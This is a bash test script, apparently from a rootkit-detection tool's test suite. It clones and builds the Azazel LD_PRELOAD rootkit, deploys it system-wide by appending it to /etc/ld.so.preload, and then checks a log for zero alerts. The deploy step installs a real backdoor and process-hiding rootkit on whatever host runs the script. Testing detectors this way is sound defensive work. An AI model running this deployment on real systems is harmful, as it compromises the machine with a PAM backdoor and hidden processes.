#!/bin/bash
# Azazel — the 2014 LD_PRELOAD rootkit (successor to JynxKit).
# Anti-debugging, PAM backdoor, encrypted backdoor (Crypthook), pcap subversion.
#
# Git: https://github.com/chokepoint/azazel
# Build: make (produces azazel.so)

set -euo pipefail

echo "[AZAZEL]     LD_PRELOAD rootkit (2014)"
echo "[SCOPE]      Userspace rootkit — negative test (zero false positives expected)"
echo ""

# ── Clone ───────────────────────────────────────────────────────────────────
BUILD_DIR="/tmp/azazel"

if [ ! -d "$BUILD_DIR" ]; then
    echo "[CLONE]      https://github.com/chokepoint/azazel"
    git clone --depth=1 https://github.com/chokepoint/azazel.git "$BUILD_DIR" 2>&1 | tail -3
fi

cd "$BUILD_DIR"

# ── Build ───────────────────────────────────────────────────────────────────
echo "[BUILD]      Compiling azazel.so..."
apt-get install -y -qq gcc make libpcap-dev libssl-dev python3 2>/dev/null || \
dnf install -y -q gcc make libpcap-devel openssl-devel python3 2>/dev/null || true

make 2>&1 | tail -5 || {
    echo "[WARN]       Build failed — using generic LD_PRELOAD test"
    exec "$(cd "$(dirname "$0")" && pwd)/../userspace/deploy.sh" azazel
}

# ── Deploy ──────────────────────────────────────────────────────────────────
if [ -f azazel.so ]; then
    echo "[DEPLOY]     Injecting azazel.so into /etc/ld.so.preload..."
    echo "$(pwd)/azazel.so" >> /etc/ld.so.preload 2>/dev/null || echo "[NOTE]     Could not write /etc/ld.so.preload"
    echo "[DEPLOY]     Azazel active — hooks libc in all new processes"
else
    echo "[WARN]       azazel.so not found"
fi

echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  EXPECTED OUTCOME                                           ║"
echo "║                                                             ║"
echo "║  Azazel hooks readdir, stat, readlink, PAM via LD_PRELOAD.  ║"
echo "║  Kernel scheduler unaffected — all processes visible to     ║"
echo "║  sched_switch regardless of userspace hiding.               ║"
echo "║                                                             ║"
echo "║  SPiCa fires ZERO alerts. Out of scope honestly stated.     ║"
echo "╚══════════════════════════════════════════════════════════════╝"

sleep 5
ALERTS=$(grep -c '\[DKOM\]\|\[TAMPER\]\|\[SILENT\]\|\[GHOST\]' /tmp/spica.log 2>/dev/null || echo "0")
if [ "$ALERTS" -eq 0 ]; then
    echo "[PASS]       Zero false positives"
else
    echo "[FAIL]       Unexpected alert(s)"
fi
